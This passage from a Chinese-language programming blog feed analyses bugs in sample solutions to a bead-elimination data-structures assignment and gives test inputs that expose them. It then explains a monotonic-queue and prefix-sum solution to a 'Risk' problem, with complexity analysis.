punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>play</code> 函数中处理左右两侧 <code>Rank</code> 时, 会对左右侧 <code>Rank</code> 进行移动. 当需要消除的字符不全处于同一数组中时, 会进行判断并将 <code>Rank</code> 移动指向不同的数组.</p><p>但是在移动左侧 <code>Rank l</code> 时使用 <code>if</code> 进行判断, 每移动一个字符的位置, <code>l</code> 最多改变一个数组的指向. 因此若存在类似 <code>CBA| |ABC</code> 的情况 (使用 “|” 分隔不同的数组), 向第三组头部插入字符 <code>A</code>, 经过一个 <code>if</code> 循环后, <code>l</code> 仅能移动到第二组而非第一组.</p><p>此时 <code>l.first = 2</code>, <code>l.second = -1</code>, 由于存储字符串使用二维数组的结构, 操作 <code>get(l)</code> 会访问到 <code>p[1][plen_bound - 1] = p[1][4095]</code>, 而非预期中的 <code>p[1][plen[1] - 1] = p[1][2]</code>, 进而导致错误地认为不能消除, 产生 <code>Wrong Answer</code>.</p><ul><li>测例构造思路</li></ul><p>输入 <code>4099</code> 位的字符串 <code>a</code> 使得 <code>a</code> 能被存储入三个数组 <code>p[0]</code>、<code>p[1]</code>、<code>p[2]</code>, 然后通过一系列插入消除使得 <code>p[1]</code> 为空, 此时 <code>p[0]</code> 的末字符与 <code>p[2]</code> 的首字符均为 <code>B</code>. 最后向 <code>p[2]</code> 首部插入字符 <code>B</code>, 但是程序错误地认为不能消除, 产生 <code>Wrong Answer</code>.</p><h3 id="代码-8"><a href="#代码-8" class="headerlink" title="代码 8"></a>代码 8</h3><ul><li><p>错误类型: <code>Wrong Answer</code></p></li><li><p>错误原因</p></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token keyword">int</span> rank<span class="token punctuation">,</span> <span class="token keyword">char</span> ch<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>l<span class="token punctuation">.</span>first <span class="token operator">&gt;=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token function">get</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span> <span class="token operator">==</span> ch<span class="token punctuation">)</span> <span class="token punctuation">{</span>        l<span class="token punctuation">.</span>second<span class="token operator">--</span><span class="token punctuation">;</span>        dis<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>l<span class="token punctuation">.</span>second <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> l<span class="token punctuation">.</span>first <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            l<span class="token punctuation">.</span>first<span class="token operator">--</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token punctuation">.</span>first <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">)</span>                l<span class="token punctuation">.</span>second <span class="token operator">+=</span> plen<span class="token punctuation">[</span>l<span class="token punctuation">.</span>first<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>r<span class="token punctuation">.</span>first <span class="token operator">&lt;</span> pn <span class="token operator">&amp;&amp;</span> <span class="token function">get</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span> <span class="token operator">==</span> ch<span class="token punctuation">)</span> <span class="token punctuation">{</span>        r<span class="token punctuation">.</span>second<span class="token operator">++</span><span class="token punctuation">;</span>        dis<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>r<span class="token punctuation">.</span>second <span class="token operator">&gt;=</span> plen<span class="token punctuation">[</span>r<span class="token punctuation">.</span>first<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> r<span class="token punctuation">.</span>first <span class="token operator">&lt;</span> pn<span class="token punctuation">)</span> <span class="token punctuation">{</span>            r<span class="token punctuation">.</span>second <span class="token operator">-=</span> plen<span class="token punctuation">[</span>r<span class="token punctuation">.</span>first<span class="token punctuation">]</span><span class="token punctuation">;</span>            r<span class="token punctuation">.</span>first<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>dis <span class="token operator">&gt;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        eliminated <span class="token operator">+=</span> dis <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>        lbound <span class="token operator">=</span> l<span class="token punctuation">;</span>        rbound <span class="token operator">=</span> r<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>play</code> 函数在寻找相同字符这一部分缺失了其他代码所有的 <code>while(1)</code> 循环, 这导致在进行一次消除后无法进行同组内的连续消除, 进而产生 <code>Wrong Answer</code>.</p><ul><li>测例构造思路</li></ul><p>串 <code>a</code> 为 <code>AABBA</code>, 向其中插入 <code>B</code> 后会先发生 <code>BBB</code> 的消除, 但无法进行 <code>AAA</code> 的连续消除, 输出 <code>AAA</code>, 产生<code>Wrong Answer</code>.</p><ul><li>构造测例</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c">AABBA<span class="token number">1</span><span class="token number">2</span> B<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="代码-9"><a href="#代码-9" class="headerlink" title="代码 9"></a>代码 9</h3><ul><li><p>错误类型: <code>Runtime Error</code></p></li><li><p>错误原因</p></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token keyword">int</span> rank<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>eliminated <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        alen <span class="token operator">-=</span> eliminated<span class="token punctuation">;</span>        l <span class="token operator">=</span> lbound<span class="token punctuation">;</span>        r <span class="token operator">=</span> rbound<span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>l<span class="token punctuation">.</span>first <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            plen<span class="token punctuation">[</span>l<span class="token punctuation">.</span>first<span class="token punctuation">]</span> <span class="token operator">=</span> l<span class="token punctuation">.</span>second <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>r<span class="token punctuation">.</span>first <span class="token operator">&lt;</span> pn<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">int</span> len <span class="token operator">=</span> plen<span class="token punctuation">[</span>r<span class="token punctuation">.</span>first<span class="token punctuation">]</span> <span class="token operator">-</span> r<span class="token punctuation">.</span>second<span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>len <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">memmove</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>p<span class="token punctuation">[</span>r<span class="token punctuation">.</span>first<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>p<span class="token punctuation">[</span>r<span class="token punctuation">.</span>first<span class="token punctuation">]</span><span class="token punctuation">[</span>r<span class="token punctuation">.</span>second<span class="token punctuation">]</span><span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            plen<span class="token punctuation">[</span>r<span class="token punctuation">.</span>first<span class="token punctuation">]</span> <span class="token operator">=</span> len<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> l<span class="token punctuation">.</span>first <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> r<span class="token punctuation">.</span>first<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            plen<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>play</code> 函数在执行消除过程中并未考虑特殊处理 <code>l.first = r.first</code> 的情形. 那么 <code>plen[l.first]</code> 被赋值为 <code>l.second + 1</code>, 接下来 <code>len = plen[r.first] - r.second = plen[l.first] - r.second</code> 为负值. 而 <code>plen[r.first]</code> 为 <code>size_t</code> 类型, 即 <code>unsigned long long</code> 类型, 从而在赋值 <code>plen[r.first] = len</code> 时会因下溢出而被赋为很大的正数.</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">p2a</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> copied <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> pn<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>a<span class="token punctuation">[</span>copied<span class="token punctuation">]</span><span class="token punctuation">,</span> p<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> plen<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        copied <span class="token operator">+=</span> plen<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时对 <code>a[copied]</code> 进行 <code>memcpy</code> 时则会因为 <code>plen[i]</code> 过大而导致越界访问到 <code>p[i]</code> 长度之外的内存, 产生 <code>Runtime Error</code>.</p><ul><li>测例构造思路</li></ul><p>只需构造一个在同一数组内发生一次消除, 产生 <code>l.first = r.first</code> 的情形. 此时会因为在 <code>memcpy(&amp;a[copied], p[0], plen[0])</code> 部分出现越界访问, 产生 <code>Runtime Error</code>.</p><ul><li>构造测例</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c">ABBC<span class="token number">1</span><span class="token number">2</span> B<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="代码-10"><a href="#代码-10" class="headerlink" title="代码 10"></a>代码 10</h3><ul><li><p>错误类型: <code>Wrong Answer</code></p></li><li><p>错误原因</p></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">play</span><span class="token punctuation">(</span><span class="token keyword">int</span> rank<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>eliminated <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> l<span class="token punctuation">.</span>first<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> r<span class="token punctuation">.</span>first<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            plen<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>play</code> 函数中消除结束后, 如果消除发生在不同的块中, 那么会将 <code>l.first</code> 所在块的长度错误地记为 <code>0</code>, 如果在后续操作中插入珠子的位置在此之后, 那么 <code>find()</code> 函数查找到的位置就会出错, 产生 <code>Wrong Answer</code>.</p><ul><li>测例构造思路</li></ul><p>输入充分长的串 <code>a</code> 使得 <code>a</code> 被存储在两个数组 <code>p[0]</code>, <code>p[1]</code> 中, 随后输出字符使得在 <code>p[0]</code>、<code>p[1]</code> 连接处产生消除, 程序将 <code>p[0]</code> 的长度错误地记为 <code>0</code>, 进而之后的插入会插入错误地位置, 直接关联到之后 <code>p2a()</code> 的过程, 产生 <code>Wrong Answer</code>.</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> DSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Risk</title>
      <link href="/17/"/>
      <url>/17/</url>
      
        <content type="html"><![CDATA[<h1 id="CST-PA2"><a href="#CST-PA2" class="headerlink" title="CST PA2"></a>CST PA2</h1><h2 id="2-1-Risk"><a href="#2-1-Risk" class="headerlink" title="2-1 Risk"></a>2-1 Risk</h2><h3 id="算法构思"><a href="#算法构思" class="headerlink" title="算法构思"></a>算法构思</h3><p>本题的思路是先求出由每一天回溯所得的最大单日确诊病例数, 然后使用前缀和算法处理得到的最大病例数数组, 最后对于每组给定的输入 <code>p</code>、<code>q</code>, 查询并输出相应的低、中风险天数.</p><p>使用数组 <code>x[i]</code> 储存每日的确诊人数, 数组 <code>m[i]</code> 储存对应的回溯天数. 实际上, 本题相当于用一个滑动窗口来扫描遍历 <code>x[i]</code> 数组, 并返回 <code>x[i - m[i]]</code> 到 <code>x[i - 1]</code> 这个窗口中的最大值.</p><p>注意到序列 <code>x[i - m[i]]</code> 是不减的, 那么窗口整体是向右移动的, 对于窗口内不同的两天 <code>i &lt; j</code>, 若经过一系列移动后 <code>i</code> 在窗口内, 那么 <code>j</code> 必然也在窗口内. 此时如果 <code>x[i] &lt;= x[j]</code>, 那么 <code>x[i]</code> 将不会对窗口中的最大值做出贡献.</p><p>这也就是说, 随着窗口右移加入新的确诊病例数, 窗口内不大于该数的数字在之后都不会成为窗口中的最大值 (它至少不大于这个新加入的确诊病例数). 也就是说, 我们可以直接删去窗口中不大于新加入确诊病例数的所有数.</p><p>构造单调队列这一数据结构, 队列中元素从队首到队尾降序排列. 对于每一次窗口扫描, 我们将窗口最右端新加入的元素与队尾元素比较, 若队尾元素不大于新入队元素, 则删去队尾元素, 最后将新元素入队. 如此操作, 保证了队列元素的单调性. 同时使用 <code>int</code> 数组与两个 <code>int</code> 类型整数 <code>header</code>、<code>trailer</code> 记录队列的首尾位置, 模拟单调队列的功能. 对于队列中的每个元素, 我们在入队的同时记录它的确诊病例数和它在原数组中的天数.</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// Line 8</span>class PriorityQueue <span class="token punctuation">{</span>public<span class="token operator">:</span>    <span class="token keyword">int</span> header <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// 指向头部.</span>    <span class="token keyword">int</span> trailer <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// 指向尾部.</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> pos<span class="token punctuation">[</span>MAXLEN <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 记录队中病例数在原数组中对应的天数.</span>    <span class="token keyword">int</span> val<span class="token punctuation">[</span>MAXLEN <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// 记录队中病例数的大小.</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>考虑到窗口的左端实际上是单调不减的, 因此在队尾元素出队后, 它不可能再次入队. 只需要查询队首元素, 如果它对应的位置不位于滑动窗口中, 则删去该元素, 最后剩下的满足条件的队首元素即是窗口中对应的最大确诊病例数. 我们使用 <code>cases[i]</code> 数组存储第 <code>i</code> 天回溯对应的最大确诊病例数. 然后遍历 <code>cases[i]</code>, 将为病例数大小 <code>k</code> 出现的天数记录在数组 <code>sum[k]</code> 中. 随后对 <code>sum</code> 数组从第二项开始求出前缀和, <code>sum[k - 1]</code> 即对应了 <code>cases</code> 数组中病例数位于 $[0, k)$ 范围内的天数. 如此操作, 我们在查询时只需访问数组 <code>sum[i]</code>, 这实现了 $O(1)$ 的复杂度.</p><h3 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h3><p>注意到 <code>p</code>, <code>q</code>, <code>m[i]</code> 的范围均为 $[1, 2^{32} - 1]$, 超过了 <code>int</code> 的范围, 因此使用 <code>long long</code> 数组存储.</p><p>若 <code>p = 0</code>, 则需直接返回低风险天数为 <code>0</code>; 若输入的 <code>p</code>、<code>q</code> 过大, 由于 <code>x[i]</code> 的范围为 $[1, 2\times 10^6]$, 在查询时应直接返回全部的风险天数. 这在代码中体现为使用 <code>flag</code> 记录最大单日确诊病例数的上界, 当超过此上界时, 直接返回 <code>sum[flag]</code>.</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 54</span><span class="token comment">// 计算病例数位于 [0, p) 范围内的天数.</span>ans1 <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">&gt;</span> flag <span class="token operator">?</span> sum<span class="token punctuation">[</span>flag<span class="token punctuation">]</span> <span class="token operator">:</span> sum<span class="token punctuation">[</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>     ans1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// 计算病例数位于 [0, q) 范围内的天数.</span>ans2 <span class="token operator">=</span> <span class="token punctuation">(</span>q <span class="token operator">&gt;</span> flag <span class="token operator">?</span> sum<span class="token punctuation">[</span>flag<span class="token punctuation">]</span> <span class="token operator">:</span> sum<span class="token punctuation">[</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> cout <span class="token operator">&lt;&lt;</span> ans1 <span class="token operator">&lt;&lt;</span> <span class="token char">' '</span> <span class="token operator">&lt;&lt;</span> ans2 <span class="token operator">-</span> ans1 <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="复杂度估计"><a href="#复杂度估计" class="headerlink" title="复杂度估计"></a>复杂度估计</h3><p>算法时间复杂度主要来自计算最大单日确诊病例、计算前缀和与查询风险天数等部分:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token comment">// Line 30</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>que<span class="token punctuation">.</span>header <span class="token operator">&lt;=</span> que<span class="token punctuation">.</span>trailer <span class="token operator">&amp;&amp;</span> que<span class="token punctuation">.</span>val<span class="token punctuation">[</span>que<span class="token punctuation">.</span>trailer<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> x<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        que<span class="token punctuation">.</span>trailer<span class="token operator">--</span><span class="token punctuation">;</span>    que<span class="token punctuation">.</span>trailer<span class="token operator">++</span><span class="token punctuation">;</span>     que<span class="token punctuation">.</span>val<span class="token punctuation">[</span>que<span class="token punctuation">.</span>trailer<span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    que<span class="token punctuation">.</span>pos<span class="token punctuation">[</span>que<span class="token punctuation">.</span>trailer<span class="token punctuation">]</span> <span class="token operator">=</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>que<span class="token punctuation">.</span>pos<span class="token punctuation">[</span>que<span class="token punctuation">.</span>header<span class="token punctuation">]</span> <span class="token operator">&lt;</span> i <span class="token operator">-</span> m<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>         que<span class="token punctuation">.</span>header<span class="token operator">++</span><span class="token punctuation">;</span>    cases<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> que<span class="token punctuation">.</span>val<span class="token punctuation">[</span>que<span class="token punctuation">.</span>header<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在计算最大单日确诊病例时, 每个元素最多入队且出队一次, 从而时间复杂度与输入元素数成正比, 为 $O(n)$;</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token comment">// Line 42</span><span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    flag <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>cases<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">;</span>    sum<span class="token punctuation">[</span>cases<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> flag<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    sum<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+=</span> sum<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在进行前缀和计算时, 由于 <code>flag = max(x[i])</code>, 从而时间复杂度为 $O(n + max(x[i]))$;</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token comment">// Line 52</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> t<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    cin <span class="token operator">&gt;&gt;</span> p <span class="token operator">&gt;&gt;</span> q<span class="token punctuation">;</span>    ans1 <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">&gt;</span> flag <span class="token operator">?</span> sum<span class="token punctuation">[</span>flag<span class="token punctuation">]</span> <span class="token operator">:</span> sum<span class="token punctuation">[</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>p <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>         ans1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    ans2 <span class="token operator">=</span> <span class="token punctuation">(</span>q <span class="token operator">&gt;</span> flag <span class="token operator">?</span> sum<span class="token punctuation">[</span>flag<span class="token punctuation">]</span> <span class="token operator">:</span> sum<span class="token punctuation">[</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> ans1 <span class="token operator">&lt;&lt;</span> <span class="token char">' '</span> <span class="token operator">&lt;&lt;</span> ans2 <span class="token operator">-</span> ans1 <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在查询风险天数时, 每次查询用时常数时间, 从而时间复杂度与查询次数成正比, 为 $O(T)$;</p><p>综上, 算法总时间复杂度为 $O(n + max(x[i]) + T)$.</p><p>算法空间复杂度主要来自读取并存储数据的过程:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 4</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MAXLEN</span> <span class="token expression"><span class="token number">1000000</span></span></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 8</span>class PriorityQueue <span class="token punctuation">{</span>public<span class="token operator">:</span>    <span class="token keyword">int</span> header <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> trailer <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> pos<span class="token punctuation">[</span>MAXLEN <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> val<span class="token punctuation">[</span>MAXLEN <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 18</span><span class="token keyword">int</span> x<span class="token punctuation">[</span>MAXLEN <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">long</span> <span class="token keyword">long</span> m<span class="token punctuation">[</span>MAXLEN <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> cases<span class="token punctuation">[</span>MAXLEN <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token keyword">int</span> sum<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> MAXLEN <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>PriorityQueue que<span 